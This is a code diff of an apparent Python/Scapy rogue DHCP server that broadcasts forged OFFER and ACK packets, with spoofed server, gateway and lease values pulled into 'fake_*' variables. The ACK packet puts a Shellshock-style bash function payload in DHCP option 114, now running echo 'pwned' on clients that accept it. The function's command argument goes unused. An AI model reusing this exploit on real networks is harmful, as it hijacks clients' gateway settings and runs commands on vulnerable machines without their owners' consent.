@@ -47,18 +47,39 @@ def get_option(dhcp_options, key):
         pass
 
 
+# broadcast_ip = '255.255.255.255'
+# fake_my_ip = '192.168.2.1'
+# fake_your_ip = '192.168.2.4'
+# fake_server_ip = '192.168.2.1'
+# fake_subnet_mask = '255.255.255.0'
+# fake_router_ip = '192.168.2.5'  # default gateway
+# fake_lease_time = 172800
+# fake_renewal_time = 86400
+# fake_rebinding_time = 138240
+
+broadcast_ip = '255.255.255.255'
+fake_my_ip = '192.168.0.31'
+fake_your_ip = '192.168.0.69'
+fake_server_ip = '192.168.0.104'
+fake_subnet_mask = '255.255.255.0'
+fake_router_ip = '192.168.0.104'  # default gateway
+fake_lease_time = 192800
+fake_renewal_time = 186400
+fake_rebinding_time = 138240
+
+
 def make_dhcp_offer_packet(raw_mac, xid):
     packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.2.1", dst='255.255.255.255') /
+              IP(src=fake_my_ip, dst=broadcast_ip) /
               UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
               DHCP(options=[("message-type", "offer"),
-                            ('server_id', '192.168.2.1'),
-                            ('subnet_mask', '255.255.255.0'),
-                            ('router', '192.168.2.5'),
-                            ('lease_time', 172800),
-                            ('renewal_time', 86400),
-                            ('rebinding_time', 138240),
+                            ('server_id', fake_server_ip),
+                            ('subnet_mask', fake_subnet_mask),
+                            ('router', fake_router_ip),
+                            ('lease_time', fake_lease_time),
+                            ('renewal_time', fake_renewal_time),
+                            ('rebinding_time', fake_rebinding_time),
                             "end"]))
 
     return packet
@@ -66,17 +87,17 @@ def make_dhcp_offer_packet(raw_mac, xid):
 
 def make_dhcp_ack_packet(raw_mac, xid, command):
     packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.2.1", dst='255.255.255.255') /
+              IP(src=fake_my_ip, dst='255.255.255.255') /
               UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
               DHCP(options=[("message-type", "ack"),
-                            ('server_id', '192.168.2.1'),
-                            ('subnet_mask', '255.255.255.0'),
-                            ('router', '192.168.2.5'),
-                            ('lease_time', 172800),
-                            ('renewal_time', 86400),
-                            ('rebinding_time', 138240),
-                            (114, b"() { ignored;}; " + b"{command}"),
+                            ('server_id', fake_server_ip),
+                            ('subnet_mask', fake_subnet_mask),
+                            ('router', fake_router_ip),
+                            ('lease_time', fake_lease_time),
+                            ('renewal_time', fake_renewal_time),
+                            ('rebinding_time', fake_rebinding_time),
+                            (114, b"() { ignored;}; " + b"echo \'pwned\'"),
                             "end"]))
 
     return packet
